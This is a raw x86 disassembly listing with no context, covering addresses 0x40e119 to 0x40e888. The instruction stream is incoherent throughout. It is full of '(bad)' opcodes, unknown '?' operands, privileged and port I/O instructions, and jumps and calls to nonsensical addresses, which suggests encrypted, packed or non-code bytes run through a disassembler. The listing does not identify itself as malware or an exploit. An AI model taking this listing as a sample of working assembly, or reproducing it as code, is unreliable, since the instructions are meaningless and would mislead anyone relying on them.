  40e119:	idiv   DWORD PTR [ebp+eiz*1-0x2ae2e000]
  40e120:	dec    esi
  40e121:	push   esp
  40e122:	add    eax,0x99d0f41e
  40e127:	dec    edi
  40e128:	aaa    
  40e129:	push   ebp
  40e12a:	mov    DWORD PTR [esi+0x17],0x9b9c0587
  40e131:	mov    bh,0xe5
  40e133:	ror    ebx,0x7d
  40e136:	jnp    0x40e0fa
  40e138:	adc    eax,0x6f129852
  40e13d:	dec    ebx
  40e13e:	sub    al,0x40
  40e140:	test   eax,0x4516550d
  40e145:	nop
  40e146:	test   eax,0x8b8187f5
  40e14b:	imul   edi
  40e14d:	sbb    eax,0x21f68579
  40e153:	sub    eax,0x3c3d75e3
  40e158:	sbb    BYTE PTR [edi],cl
  40e15a:	fist   DWORD PTR [eax-0x1c0b5efa]
  40e160:	dec    esp
  40e161:	sbb    edi,eax
  40e163:	dec    ebx
  40e164:	xchg   edx,eax
  40e165:	sti    
  40e166:	lds    ecx,FWORD PTR [edi]
  40e168:	das    
  40e169:	fxch   st(2)
  40e16b:	sbb    BYTE PTR [eax-0x79ad7c79],cl
  40e171:	push   ebx
  40e172:	fdiv   st(1),st
  40e174:	hlt    
  40e175:	push   esi
  40e176:	shr    BYTE PTR [edi+0x31],1
  40e179:	js     0x40e1f8
  40e17b:	mov    bh,0x56
  40e17d:	jbe    0x40e1ba
  40e17f:	pop    esi
  40e180:	in     eax,0x84
  40e182:	and    DWORD PTR [edx+esi*4+0x8],ecx
  40e186:	popa   
  40e187:	xor    al,0x31
  40e189:	lea    esi,[edx]
  40e18b:	gs or  esp,ecx
  40e18e:	inc    esi
  40e18f:	sbb    edx,ecx
  40e191:	push   cs
  40e192:	test   al,0x1d
  40e194:	mov    cl,0xf4
  40e196:	mov    dh,0x34
  40e198:	dec    ebx
  40e199:	test   BYTE PTR [edi+0x26467db6],0x21
  40e1a0:	and    bl,BYTE PTR [ecx+0x3498cff8]
  40e1a6:	push   0xfb4caada
  40e1ab:	mov    edx,ecx
  40e1ad:	daa    
  40e1ae:	shl    DWORD PTR [ebp-0x7d1a00d5],1
  40e1b4:	pop    ecx
  40e1b5:	(bad)  [edx+ecx*8]
  40e1b8:	and    eax,0xea556ab
  40e1bd:	adc    DWORD PTR [edi+0x22],0xcc84042a
  40e1c4:	lods   eax,DWORD PTR ds:[esi]
  40e1c5:	mov    ds:0xf00528d1,al
  40e1ca:	pop    ss
  40e1cb:	mov    edx,DWORD PTR [edx-0xe]
  40e1ce:	fiadd  WORD PTR [ecx+0xf]
  40e1d1:	fsub   QWORD PTR [edi-0x22]
  40e1d4:	mov    BYTE PTR [edi-0x3],cl
  40e1d7:	mov    ds:0x69ecc471,al
  40e1dc:	ins    DWORD PTR es:[edi],dx
  40e1dd:	mov    al,ds:0x71ab79c3
  40e1e2:	xor    esi,DWORD PTR [esi+0x1d]
  40e1e5:	outs   dx,BYTE PTR ds:[esi]
  40e1e6:	jg     0x40e1a9
  40e1e8:	das    
  40e1e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1ea:	popa   
  40e1eb:	pusha  
  40e1ec:	sub    DWORD PTR [eax*4+0x67013fd8],0x29f06602
  40e1f7:	iret   
  40e1f8:	int    0x41
  40e1fa:	mov    dh,0x31
  40e1fc:	imul   ebp,DWORD PTR [eax+edi*4+0x7fa70a7d],0xffffffba
  40e204:	mov    dh,0x2f
  40e206:	in     al,dx
  40e207:	stos   DWORD PTR es:[edi],eax
  40e208:	aad    0x66
  40e20a:	xchg   esi,eax
  40e20b:	sbb    esi,DWORD PTR [esi+edi*4+0x1c]
  40e20f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e210:	je     0x40e21f
  40e212:	fld    QWORD PTR [ebp+0x74]
  40e215:	fld    QWORD PTR [edx+esi*1-0x5130ab0b]
  40e21c:	aad    0xac
  40e21e:	fcomp  QWORD PTR [ecx+ecx*2]
  40e221:	push   ecx
  40e222:	retf   0x346b
  40e225:	fsub   QWORD PTR [ebp+edi*4-0x3728298b]
  40e22c:	scas   eax,DWORD PTR es:[edi]
  40e22d:	ins    BYTE PTR es:[edi],dx
  40e22e:	data16 cmc 
  40e230:	inc    esi
  40e231:	xor    ecx,DWORD PTR [ebx+ebx*8+0x6c]
  40e235:	retf   0xe306
  40e238:	fwait
  40e239:	pop    ds
  40e23a:	xchg   ecx,eax
  40e23b:	lds    edi,FWORD PTR [ebp+ebp*2-0x65]
  40e23f:	pop    edx
  40e240:	out    dx,eax
  40e241:	adc    al,0xc3
  40e243:	push   ss
  40e244:	or     ch,bl
  40e246:	out    dx,al
  40e247:	sti    
  40e248:	pusha  
  40e249:	test   al,0x4b
  40e24b:	inc    esi
  40e24c:	call   0xc5332613
  40e251:	xchg   edi,eax
  40e252:	mov    bh,BYTE PTR [esi-0x74]
  40e255:	push   ebx
  40e256:	push   esp
  40e258:	js     0x40e1e0
  40e25a:	lods   al,BYTE PTR ds:[esi]
  40e25b:	add    bl,BYTE PTR ds:0xbdeb48cc
  40e261:	jnp    0x40e264
  40e263:	rcl    BYTE PTR [edi-0x60040c9],1
  40e269:	jp     0x40e25f
  40e26b:	rol    BYTE PTR [ebp+0x1b],cl
  40e26e:	inc    esp
  40e26f:	mov    cl,0xf2
  40e271:	(bad)  
  40e272:	xor    eax,DWORD PTR [ecx]
  40e274:	lock ss push 0x59
  40e278:	xchg   esi,eax
  40e279:	xor    ebp,DWORD PTR [ebp+0x73]
  40e27c:	int    0x4b
  40e27e:	in     eax,dx
  40e27f:	inc    ebx
  40e280:	addr16 daa 
  40e282:	jg     0x40e26d
  40e284:	inc    esp
  40e285:	fwait
  40e286:	push   edi
  40e287:	pop    ss
  40e288:	hlt    
  40e289:	adc    bh,dh
  40e28b:	jmp    0x40e2f7
  40e28d:	out    dx,al
  40e28e:	hlt    
  40e28f:	pop    ds
  40e290:	mov    DWORD PTR [edx+0x1c4a2992],ecx
  40e296:	or     al,0x70
  40e298:	nop
  40e299:	push   ecx
  40e29a:	ss pop es
  40e29c:	cmp    BYTE PTR [eax],ch
  40e29e:	inc    ebx
  40e29f:	xor    DWORD PTR [edi],0xffffff93
  40e2a2:	dec    ebx
  40e2a3:	in     al,dx
  40e2a4:	adc    eax,0x619c06b3
  40e2a9:	xor    DWORD PTR [ebx-0x19],edx
  40e2ac:	mov    ds:0x2c0158ff,al
  40e2b1:	mov    BYTE PTR [ecx-0x269b7610],bl
  40e2b7:	test   al,0x73
  40e2b9:	scas   al,BYTE PTR es:[edi]
  40e2ba:	in     eax,dx
  40e2bb:	icebp  
  40e2bc:	lock addr16 es inc ecx
  40e2c0:	fdiv   QWORD PTR [edx-0x44b4893a]
  40e2c6:	loopne 0x40e322
  40e2c8:	add    eax,0x95e0439a
  40e2cd:	jecxz  0x40e293
  40e2cf:	mov    ch,BYTE PTR [edx+esi*4+0x7341681a]
  40e2d6:	push   edi
  40e2d7:	mov    ebp,0xcf8b58b1
  40e2dc:	xlat   BYTE PTR ds:[ebx]
  40e2dd:	loopne 0x40e305
  40e2df:	or     bl,BYTE PTR [edi]
  40e2e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2e2:	push   edx
  40e2e3:	or     edx,DWORD PTR [ebx-0x51]
  40e2e6:	inc    edx
  40e2e7:	(bad)  
  40e2e8:	(bad)  
  40e2e9:	and    eax,0xdce35aba
  40e2ee:	pop    ds
  40e2ef:	jae    0x40e318
  40e2f1:	popa   
  40e2f2:	fbstp  TBYTE PTR [edi+0x77]
  40e2f5:	push   0xffffff92
  40e2f7:	fcomi  st,st(0)
  40e2f9:	jbe    0x40e2c6
  40e2fb:	cs nop
  40e2fd:	cmp    DWORD PTR ds:[edx+0x5dba0682],esp
  40e304:	xchg   edi,eax
  40e305:	inc    edi
  40e306:	imul   ebp
  40e308:	in     eax,0x75
  40e30a:	shl    DWORD PTR [esi-0x32],1
  40e30d:	mov    ds:0xa7b52ecd,al
  40e312:	cmp    dl,BYTE PTR [esi+0x6b52e0bd]
  40e318:	mov    ebx,0x3865e853
  40e31d:	popf   
  40e31e:	xchg   edi,eax
  40e31f:	(bad)  
  40e320:	jo     0x40e369
  40e322:	inc    ebx
  40e323:	(bad)  
  40e324:	mov    ds:0x80a0a282,al
  40e329:	sbb    ebp,ebx
  40e32b:	in     eax,dx
  40e32c:	xor    al,0xe
  40e32e:	pop    ebp
  40e32f:	(bad)  
  40e330:	shl    BYTE PTR [eax+edx*4],cl
  40e333:	push   es
  40e334:	ins    DWORD PTR es:[edi],dx
  40e335:	or     ch,BYTE PTR [ebp-0x77]
  40e338:	out    0xca,al
  40e33a:	xchg   edx,eax
  40e33b:	inc    edx
  40e33c:	xchg   ebp,eax
  40e33d:	cmp    edi,eax
  40e33f:	arpl   WORD PTR [ecx],ax
  40e341:	dec    ebp
  40e342:	adc    ebp,DWORD PTR [eax-0x3c]
  40e345:	xor    DWORD PTR [esi-0x43],ecx
  40e348:	fs and dl,bl
  40e34b:	fstp   DWORD PTR [esi]
  40e34d:	pop    edx
  40e34e:	jns    0x40e2d5
  40e350:	test   ah,bl
  40e352:	repz lock and dh,BYTE PTR [edx+0x5d]
  40e357:	ret    0x634a
  40e35a:	adc    edi,DWORD PTR ds:0xc7396167
  40e360:	loop   0x40e34a
  40e362:	or     al,0xb3
  40e364:	xor    BYTE PTR [eax+0x4c],al
  40e367:	(bad)  
  40e368:	adc    eax,0x63b8d310
  40e36d:	lds    edx,FWORD PTR [ecx+0x7be0dc30]
  40e373:	cmp    edi,DWORD PTR [edx-0x4af987ad]
  40e379:	or     al,0x78
  40e37b:	cmp    al,0x33
  40e37d:	cmp    edi,esp
  40e37f:	add    eax,0xb66356c5
  40e384:	sahf   
  40e385:	or     eax,0x913d270b
  40e38a:	pusha  
  40e38b:	addr16 push ebp
  40e38d:	and    eax,DWORD PTR [ebx]
  40e38f:	push   esp
  40e390:	ret    
  40e391:	cmp    al,ah
  40e393:	int3   
  40e394:	xor    DWORD PTR [ebx-0x67],esi
  40e397:	cli    
  40e398:	xlat   BYTE PTR ds:[ebx]
  40e399:	(bad)  [ecx]
  40e39b:	fstp   QWORD PTR [esp+ebx*1+0x69]
  40e39f:	loopne 0x40e408
  40e3a1:	and    DWORD PTR [ebp-0x32554547],edi
  40e3a7:	dec    ebx
  40e3a8:	sub    cl,BYTE PTR [edi]
  40e3aa:	shl    BYTE PTR ds:0x9eb49c4,1
  40e3b0:	int    0xc4
  40e3b2:	xchg   ecx,eax
  40e3b3:	inc    BYTE PTR [edi+0x76a8860b]
  40e3b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3ba:	jp     0x40e38d
  40e3bc:	xor    esp,ecx
  40e3be:	arpl   bx,cx
  40e3c0:	mov    edi,0xe06dcd4d
  40e3c5:	pushf  
  40e3c6:	adc    BYTE PTR [esi+ebx*8-0x12087ffc],bl
  40e3cd:	dec    esi
  40e3ce:	in     eax,dx
  40e3cf:	and    eax,0xc62889e3
  40e3d4:	jo     0x40e3b9
  40e3d6:	cwde   
  40e3d7:	(bad)  
  40e3d8:	jmp    0xedf5a351
  40e3dd:	push   edx
  40e3de:	aas    
  40e3df:	push   ecx
  40e3e0:	sbb    DWORD PTR [ebp+0x3e150121],0xfffffffd
  40e3e7:	xor    eax,0x4d9bb8cc
  40e3ec:	adc    eax,0x40b01d36
  40e3f1:	push   ss
  40e3f2:	out    0xe0,eax
  40e3f4:	jbe    0x40e3a0
  40e3f6:	les    esp,FWORD PTR [edi+0x375e51d3]
  40e3fc:	mov    bh,0xb1
  40e3fe:	xor    dl,bl
  40e400:	and    dh,BYTE PTR [ebx]
  40e402:	aad    0x30
  40e404:	aaa    
  40e405:	je     0x40e47f
  40e407:	lea    ecx,[ebx]
  40e409:	mov    al,ds:0x2f2c4a20
  40e40e:	imul   ebp,DWORD PTR [eax-0x5a],0xa203a72a
  40e415:	jmp    0xdac7:0x5b54556
  40e41c:	xor    ch,al
  40e41e:	pop    esi
  40e41f:	cdq    
  40e420:	jo     0x40e431
  40e422:	popf   
  40e423:	int    0x8
  40e425:	cdq    
  40e426:	fist   WORD PTR [eax-0x7]
  40e429:	cli    
  40e42a:	mov    cl,bl
  40e42c:	repnz iret 
  40e42e:	bnd gs jl 0x40e48d
  40e432:	jl     0x40e41b
  40e434:	shl    DWORD PTR [edi-0x2327edc4],1
  40e43a:	sub    esp,eax
  40e43c:	(bad)  
  40e43d:	xchg   ebp,eax
  40e43e:	out    0xa1,al
  40e440:	xchg   BYTE PTR [eax+0x7],ch
  40e443:	adc    bl,BYTE PTR [ecx-0x4423eb41]
  40e449:	retf   
  40e44a:	xchg   ebp,eax
  40e44b:	and    edi,DWORD PTR [ecx+0x52]
  40e44e:	rcl    DWORD PTR [ebx-0x7e],1
  40e451:	ja     0x40e425
  40e453:	add    ebx,eax
  40e455:	and    eax,0x20ef67ca
  40e45a:	js     0x40e47d
  40e45c:	call   0x46b7ec9a
  40e461:	mov    ebx,0xda497654
  40e466:	int    0xb3
  40e468:	enter  0x4a7,0xdf
  40e46c:	cmp    bh,BYTE PTR [ebx]
  40e46e:	pusha  
  40e46f:	pop    ebx
  40e470:	scas   eax,DWORD PTR es:[edi]
  40e471:	call   DWORD PTR [ebp+0x3f]
  40e474:	and    eax,0xa1497256
  40e479:	push   esp
  40e47a:	dec    esp
  40e47b:	dec    ebx
  40e47c:	dec    esi
  40e47d:	mov    cl,0xa8
  40e47f:	jae    0x40e468
  40e481:	pushf  
  40e482:	inc    ecx
  40e483:	aas    
  40e484:	jbe    0x40e440
  40e486:	adc    DWORD PTR [eax],0x4f
  40e489:	jbe    0x40e4ff
  40e48b:	mov    ah,0xf8
  40e48d:	or     ah,BYTE PTR [edx+0x5e14d537]
  40e493:	cmp    DWORD PTR [ebp-0x56],ebx
  40e496:	rep lods eax,DWORD PTR cs:[esi]
  40e499:	in     al,dx
  40e49a:	jae    0x40e47a
  40e49c:	mov    al,0x58
  40e49e:	mov    ds,WORD PTR [ebp+0x65]
  40e4a1:	js     0x40e509
  40e4a3:	mov    ebx,DWORD PTR [ebp-0x4d]
  40e4a6:	adc    dl,BYTE PTR ds:0x7e825d
  40e4ac:	sub    al,0x36
  40e4ae:	pop    edx
  40e4af:	data16 inc BYTE PTR [esi+ebx*4-0x1b]
  40e4b4:	retf   0xe4ad
  40e4b7:	out    dx,al
  40e4b8:	add    al,0x70
  40e4ba:	test   DWORD PTR [esi+0x4c],edi
  40e4bd:	jo     0x40e51a
  40e4bf:	sub    DWORD PTR [ebx+0x1c2d5776],edi
  40e4c5:	xor    al,0x96
  40e4c7:	cmp    al,BYTE PTR [edx]
  40e4c9:	xor    ah,BYTE PTR [eax]
  40e4cb:	dec    ecx
  40e4cc:	stc    
  40e4cd:	mov    cl,0x96
  40e4cf:	sahf   
  40e4d0:	ret    0x793c
  40e4d3:	and    BYTE PTR [ecx-0x70],bh
  40e4d6:	and    DWORD PTR [edx-0x73758d8a],0x8b998e3
  40e4e0:	scas   eax,DWORD PTR es:[edi]
  40e4e1:	pop    ss
  40e4e2:	das    
  40e4e3:	mov    ah,bl
  40e4e5:	(bad)  
  40e4e6:	setne  BYTE PTR [esi]
  40e4e9:	jb     0x40e47a
  40e4eb:	mov    ebp,0x3f60702d
  40e4f0:	daa    
  40e4f1:	push   edi
  40e4f2:	xchg   ebx,eax
  40e4f3:	or     eax,0xa37bf332
  40e4f8:	pop    eax
  40e4f9:	nop
  40e4fa:	mov    esp,0xb6dc149c
  40e4ff:	add    BYTE PTR [ebx-0x2d],ah
  40e502:	xor    dl,bh
  40e504:	in     eax,0xad
  40e506:	in     eax,dx
  40e507:	mov    ch,0x4d
  40e509:	sbb    ecx,DWORD PTR [edi+0x78ffa8e]
  40e50f:	inc    ebx
  40e510:	xchg   esp,eax
  40e511:	add    al,0xa1
  40e513:	sbb    dl,ah
  40e515:	inc    ebx
  40e516:	inc    ecx
  40e517:	jb     0x40e58f
  40e519:	inc    ecx
  40e51a:	sbb    eax,ecx
  40e51c:	ds inc edi
  40e51e:	js     0x40e568
  40e520:	ss jne 0x40e524
  40e523:	mov    ?,WORD PTR [ebx-0x1c]
  40e526:	mov    ?,WORD PTR [ebp-0x25]
  40e529:	int3   
  40e52a:	push   cs
  40e52b:	aam    0xae
  40e52d:	mov    esp,0x21c1f131
  40e532:	pop    ds
  40e533:	fnstsw WORD PTR [eax+edi*2]
  40e536:	push   ebp
  40e537:	inc    ebp
  40e538:	jg     0x40e4f2
  40e53a:	daa    
  40e53b:	loope  0x40e5a5
  40e53d:	mov    bl,0xc9
  40e53f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e540:	add    eax,0x8e1ed23b
  40e545:	xchg   ebp,eax
  40e546:	inc    ebp
  40e547:	jg     0x40e51b
  40e549:	xchg   esi,eax
  40e54a:	lods   al,BYTE PTR ds:[esi]
  40e54b:	fidiv  WORD PTR [ebx+ecx*2]
  40e54e:	push   ebp
  40e54f:	jmp    0xc8f826fb
  40e554:	fldcw  WORD PTR [ecx+ebx*2]
  40e557:	mov    eax,ds:0xc4f45a50
  40e55c:	xor    ch,0x9d
  40e55f:	inc    esp
  40e560:	mov    bh,0x9d
  40e562:	aam    0xda
  40e564:	cmp    esp,DWORD PTR [edi+0x25]
  40e567:	xor    al,0x1d
  40e569:	mov    esi,0x71599111
  40e56e:	aam    0xb5
  40e570:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40e572:	and    edx,DWORD PTR [esi]
  40e574:	fiadd  WORD PTR [edx+0x54]
  40e577:	addr16 dec ecx
  40e579:	and    ebx,DWORD PTR [ecx+0x27347968]
  40e57f:	pop    esp
  40e580:	cmp    eax,0x72a19135
  40e585:	dec    edx
  40e586:	push   cs
  40e587:	mov    WORD PTR [eax-0x13],?
  40e58a:	icebp  
  40e58b:	dec    eax
  40e58c:	cmp    edi,ecx
  40e58e:	cwde   
  40e58f:	stc    
  40e590:	lahf   
  40e591:	call   0x981a8fa2
  40e596:	mov    ss,edx
  40e598:	cli    
  40e599:	sub    al,0x49
  40e59b:	aam    0x8d
  40e59d:	adc    ebp,edx
  40e59f:	adc    eax,0xc77c7a2e
  40e5a4:	jno    0x40e559
  40e5a6:	ds out 0x21,al
  40e5a9:	jns    0x40e5cf
  40e5ab:	shl    BYTE PTR [edi-0x5b81ad26],0xa3
  40e5b2:	in     eax,dx
  40e5b3:	ror    BYTE PTR [edi],1
  40e5b5:	mov    dl,0xd
  40e5b7:	mov    eax,0x5e11f3f2
  40e5bc:	mov    edi,0x6ae546c6
  40e5c1:	shl    dh,1
  40e5c3:	loope  0x40e5e5
  40e5c5:	jbe    0x40e585
  40e5c7:	xor    eax,0xef2f7de4
  40e5cc:	lock shr DWORD PTR [esi+0x8b481a7],0x9
  40e5d4:	xor    al,0x5d
  40e5d6:	clc    
  40e5d7:	push   0xb9a2af75
  40e5dc:	(bad)  
  40e5dd:	lock pop ebp
  40e5df:	lods   eax,DWORD PTR ds:[esi]
  40e5e0:	jbe    0x40e591
  40e5e2:	repnz cmp eax,0x4f0e61b8
  40e5e8:	cmp    DWORD PTR [ebp+0x68d572bf],esp
  40e5ee:	cwde   
  40e5ef:	clc    
  40e5f0:	inc    edx
  40e5f1:	jmp    0x7d96:0x4678cd60
  40e5f8:	gs test al,0x6
  40e5fb:	xchg   edi,eax
  40e5fc:	cld    
  40e5fd:	popf   
  40e5fe:	in     eax,0x8a
  40e600:	and    dl,dh
  40e602:	add    edi,0xfffffff8
  40e605:	jo     0x40e5ea
  40e607:	shl    DWORD PTR [edi+0x9245059],cl
  40e60d:	add    al,0xac
  40e60f:	shl    BYTE PTR [ebx+0x1bf80dbe],0x5a
  40e616:	je     0x40e658
  40e618:	lods   al,BYTE PTR ds:[esi]
  40e619:	sub    ebp,DWORD PTR [eax-0x2e]
  40e61c:	adc    esi,DWORD PTR [esi+ecx*8]
  40e61f:	in     al,dx
  40e620:	dec    edi
  40e621:	jle    0x40e5ce
  40e623:	xchg   edx,eax
  40e624:	retf   
  40e625:	outs   dx,BYTE PTR ds:[esi]
  40e626:	adc    esp,esp
  40e628:	sub    eax,0xd8ba6796
  40e62d:	mov    edx,0xf3d7a95e
  40e632:	sub    al,0x9d
  40e634:	div    BYTE PTR [ebp+0x876006]
  40e63a:	xor    DWORD PTR [ecx-0x1183b323],edi
  40e640:	clc    
  40e641:	xchg   esp,eax
  40e642:	stos   BYTE PTR es:[edi],al
  40e643:	xor    al,0xf6
  40e645:	dec    ebx
  40e646:	lds    ebp,FWORD PTR ss:[ebp-0x6ad88906]
  40e64d:	xchg   bh,dh
  40e64f:	repnz test DWORD PTR [ecx-0x38b939c4],0x8d6faee9
  40e65a:	push   cs
  40e65b:	mov    esp,0xefafa36a
  40e660:	jp     0x40e697
  40e662:	in     eax,0x32
  40e664:	cmp    al,0x3d
  40e666:	fnstcw WORD PTR [edx+edx*2+0x5bb453a]
  40e66d:	loopne 0x40e6a6
  40e66f:	mov    al,ds:0xfa82378a
  40e674:	aaa    
  40e675:	or     dh,BYTE PTR [ecx]
  40e677:	inc    edx
  40e678:	xor    ebx,DWORD PTR [ebx-0x17504a6a]
  40e67e:	clc    
  40e67f:	xchg   esp,eax
  40e680:	sbb    BYTE PTR ds:0xf5e6590e,0xd4
  40e687:	out    0x82,eax
  40e689:	sub    DWORD PTR [ecx+ecx*2-0x7b6d49b4],0xd
  40e691:	pop    eax
  40e692:	xchg   ebx,eax
  40e693:	mov    edx,0xc84d16fc
  40e698:	test   al,0xe
  40e69a:	nop
  40e69b:	pop    ss
  40e69c:	das    
  40e69d:	jne    0x40e659
  40e69f:	and    al,0x69
  40e6a1:	or     BYTE PTR [edx],ah
  40e6a3:	shr    bh,0x1f
  40e6a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6a7:	jb     0x40e629
  40e6a9:	jbe    0x40e683
  40e6ab:	aad    0xa8
  40e6ad:	or     ecx,DWORD PTR [eax-0x6700920d]
  40e6b3:	mov    bl,0x2b
  40e6b5:	jp     0x40e63a
  40e6b7:	push   es
  40e6b8:	ss mov ah,0x1
  40e6bb:	fwait
  40e6bc:	loope  0x40e6e1
  40e6be:	mov    edi,0xef878cd3
  40e6c3:	adc    BYTE PTR [eax-0x57],bh
  40e6c6:	bts    DWORD PTR [edi+ebx*2],esp
  40e6ca:	sti    
  40e6cb:	out    0xf1,al
  40e6cd:	je     0x40e6f9
  40e6cf:	push   edi
  40e6d0:	icebp  
  40e6d1:	sbb    al,0xf6
  40e6d3:	retf   0x1759
  40e6d6:	jl     0x40e67a
  40e6d8:	sub    BYTE PTR [eax+0x7d152a65],dh
  40e6de:	mov    ecx,?
  40e6e0:	retf   0xde11
  40e6e3:	dec    ecx
  40e6e4:	fs loopne 0x40e6ba
  40e6e7:	xchg   edi,eax
  40e6e8:	adc    ah,BYTE PTR [edi+0x3282677e]
  40e6ee:	mov    ch,0x15
  40e6f0:	idiv   BYTE PTR [ebx-0x336cde8c]
  40e6f6:	sub    ecx,DWORD PTR [ebp+0x3]
  40e6f9:	adc    eax,0x3777d080
  40e6fe:	mov    al,ds:0xa81a0441
  40e703:	in     eax,0xb0
  40e705:	push   esp
  40e706:	stos   BYTE PTR es:[edi],al
  40e707:	rcr    BYTE PTR [edi],1
  40e709:	inc    edx
  40e70a:	cld    
  40e70b:	sub    ch,BYTE PTR [di+0x6829]
  40e710:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e712:	xchg   ebx,eax
  40e713:	out    0xc6,eax
  40e715:	(bad)  
  40e716:	outs   dx,DWORD PTR ds:[esi]
  40e717:	mov    esp,0x86f5447d
  40e71c:	int3   
  40e71d:	inc    cl
  40e71f:	pop    ds
  40e720:	lahf   
  40e721:	xchg   edi,eax
  40e722:	je     0x40e6d0
  40e724:	inc    ecx
  40e725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e726:	mov    ?,WORD PTR [ecx+0x704d4696]
  40e72c:	inc    esi
  40e72d:	jno    0x40e764
  40e72f:	xchg   esp,eax
  40e730:	pusha  
  40e731:	outs   dx,DWORD PTR ds:[esi]
  40e732:	mov    bl,0x68
  40e734:	mov    al,ds:0x2897b36b
  40e739:	aad    0x3b
  40e73b:	and    bl,BYTE PTR [edx+edi*8+0x5c712f33]
  40e742:	mov    al,ds:0xae03eaf3
  40e747:	jp     0x40e761
  40e749:	pop    edi
  40e74a:	jp     0x40e70a
  40e74c:	jbe    0x40e6de
  40e74e:	pop    ds
  40e74f:	inc    ecx
  40e750:	dec    esp
  40e751:	or     BYTE PTR [esi+0x3f9b881e],bl
  40e757:	inc    ebp
  40e758:	rcl    BYTE PTR [edx],1
  40e75a:	push   es
  40e75b:	mov    dl,0x5c
  40e75d:	pop    es
  40e75e:	retf   0x9a94
  40e761:	out    dx,eax
  40e762:	retf   
  40e763:	cs stos BYTE PTR es:[edi],al
  40e765:	pop    ebx
  40e766:	sub    eax,0x1dc1e995
  40e76b:	sub    eax,0x297e962c
  40e770:	dec    esp
  40e771:	popa   
  40e772:	das    
  40e773:	sub    eax,0xdd223750
  40e778:	xchg   edi,eax
  40e779:	jle    0x40e749
  40e77b:	cdq    
  40e77c:	push   ebx
  40e77d:	sbb    DWORD PTR [ebp-0x45],0xcc39e1c5
  40e784:	leave  
  40e785:	mov    bh,ch
  40e787:	mov    bh,0x8b
  40e789:	cld    
  40e78a:	(bad)  
  40e78b:	scas   al,BYTE PTR es:[edi]
  40e78c:	sub    ebx,edi
  40e78e:	or     eax,0x6538b6ad
  40e793:	arpl   WORD PTR [esi+0x3e291ae8],dx
  40e799:	and    DWORD PTR [ebx-0x3e9f4c7a],esi
  40e79f:	and    dh,dl
  40e7a1:	jo     0x40e7ae
  40e7a3:	adc    eax,0xca1fc743
  40e7a8:	dec    ebp
  40e7a9:	stos   BYTE PTR es:[edi],al
  40e7aa:	mov    ebp,0x7ef3a2b2
  40e7af:	out    0x31,al
  40e7b1:	retf   
  40e7b2:	pop    ebp
  40e7b3:	stos   DWORD PTR es:[edi],eax
  40e7b4:	inc    eax
  40e7b5:	add    dl,BYTE PTR [edx-0x428abe4c]
  40e7bb:	adc    dh,ch
  40e7bd:	icebp  
  40e7be:	cmp    bh,BYTE PTR [eax]
  40e7c0:	dec    DWORD PTR [ebx]
  40e7c2:	jecxz  0x40e826
  40e7c4:	sahf   
  40e7c5:	test   eax,0x40a159d2
  40e7ca:	mov    eax,0x8fca2113
  40e7cf:	sbb    bl,BYTE PTR [eax+0x5f]
  40e7d2:	cli    
  40e7d3:	push   ebp
  40e7d4:	nop
  40e7d5:	push   cs
  40e7d6:	add    ebp,DWORD PTR [ebp-0x7a]
  40e7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7da:	retf   0x3321
  40e7dd:	shl    DWORD PTR [eax],1
  40e7df:	cmp    edx,0x4a
  40e7e2:	test   DWORD PTR [eax],0xc18aa4a1
  40e7e8:	js     0x40e822
  40e7ea:	push   esp
  40e7eb:	fnstenv [ebx+0x1bfdce48]
  40e7f1:	adc    bh,BYTE PTR [esi+0x28fc9974]
  40e7f7:	mov    ebp,0x76dc4db6
  40e7fc:	rcl    bh,cl
  40e7fe:	pop    edx
  40e7ff:	adc    al,0x22
  40e801:	pushf  
  40e802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e803:	jne    0x40e82d
  40e805:	add    ecx,DWORD PTR [esi+0x4]
  40e808:	(bad)  
  40e809:	xchg   edi,eax
  40e80a:	std    
  40e80b:	not    BYTE PTR [edi+ebx*2-0x37]
  40e80f:	ins    BYTE PTR es:[edi],dx
  40e810:	add    edx,DWORD PTR [ecx-0xfeb7414]
  40e816:	sbb    cl,BYTE PTR [esi]
  40e818:	inc    esi
  40e819:	cmp    BYTE PTR [ebx+0x57745981],ch
  40e81f:	aad    0x4d
  40e821:	push   cs
  40e822:	inc    ecx
  40e823:	aaa    
  40e824:	aam    0x56
  40e826:	mov    al,ds:0x907566ee
  40e82b:	mov    cl,0x0
  40e82d:	cdq    
  40e82e:	sbb    BYTE PTR [esp+edx*4+0x5b],bl
  40e832:	out    dx,al
  40e833:	popf   
  40e834:	push   cs
  40e835:	jnp    0x40e8b2
  40e837:	cld    
  40e838:	leave  
  40e839:	(bad)  
  40e83a:	stc    
  40e83b:	and    eax,0x52965c27
  40e840:	repz repz loop 0x40e8a7
  40e844:	test   BYTE PTR [eax+0x3a],0x33
  40e848:	iret   
  40e849:	jecxz  0x40e87f
  40e84b:	jns    0x40e808
  40e84d:	in     al,0x23
  40e84f:	ret    0x2ac3
  40e852:	loope  0x40e8b7
  40e854:	push   edi
  40e855:	outs   dx,BYTE PTR ds:[esi]
  40e856:	test   al,0x4f
  40e858:	mov    WORD PTR [ebx+0x35],ds
  40e85b:	lahf   
  40e85c:	sbb    dl,BYTE PTR [ecx+0x71f56a80]
  40e862:	lods   al,BYTE PTR ds:[esi]
  40e863:	sbb    DWORD PTR [edi],edi
  40e865:	mov    dl,0x9d
  40e867:	cld    
  40e868:	xchg   DWORD PTR [esi+ecx*1-0x5b],eax
  40e86c:	jb     0x40e890
  40e86e:	sahf   
  40e86f:	fldcw  WORD PTR [ecx-0x21]
  40e872:	or     bl,cl
  40e874:	les    esp,FWORD PTR [eax-0x1c66ed71]
  40e87a:	outs   dx,DWORD PTR ds:[esi]
  40e87b:	jne    0x40e811
  40e87d:	aad    0x85
  40e87f:	push   ebp
  40e880:	sub    al,BYTE PTR [eax]
  40e882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e883:	pop    ds
  40e884:	dec    eax
  40e885:	retf   
  40e886:	jp     0x40e8ff
  40e888:	inc    eax
